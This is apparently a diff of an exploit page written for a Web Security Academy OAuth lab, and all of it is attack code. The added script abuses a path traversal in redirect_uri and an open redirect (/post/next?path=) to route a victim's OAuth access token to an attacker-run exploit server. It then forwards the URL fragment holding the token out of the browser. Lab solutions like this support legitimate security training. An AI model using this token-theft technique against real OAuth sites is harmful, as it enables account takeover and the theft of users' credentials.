@@ -1,10 +1,13 @@
 <html>
-    <body>
-        <script>
-            const redirect_uri = "https://0a7d00c903f2cb18815e573000f100c0.web-security-academy.net/oauth-callback"
+    <script>
+        if (!document.location.hash) {
+            const attackers_server_uri = "https://exploit-0a9e0082035bbcde80c320f6018700ee.exploit-server.net/exploit"
+            const redirect_uri = `https://0a7e005f0376bcf1807721b000fb00dd.web-security-academy.net/oauth-callback/../post/next?path=${attackers_server_uri}`
 
-            document.location = `https://oauth-0a3400590324cbe1817655c102ed00c9.oauth-server.net/auth?client_id=hd47h2w2iet71wy3q9scr&redirect_uri=${redirect_uri}&response_type=token&nonce=-71635694&scope=openid%20profile%20emaill`
-        </script>
-    </body>
+            document.location = `https://oauth-0acd00cc0315bc0580bc1fc6024b0017.oauth-server.net/auth?client_id=mql1yse6vpmkaeohozcdh&redirect_uri=${redirect_uri}&response_type=token&nonce=-626744892&scope=openid%20profile%20emaill`
+        } else {
+            window.location = '/?'+document.location.hash.substr(1)
+        }
+    </script>
 </html>
 
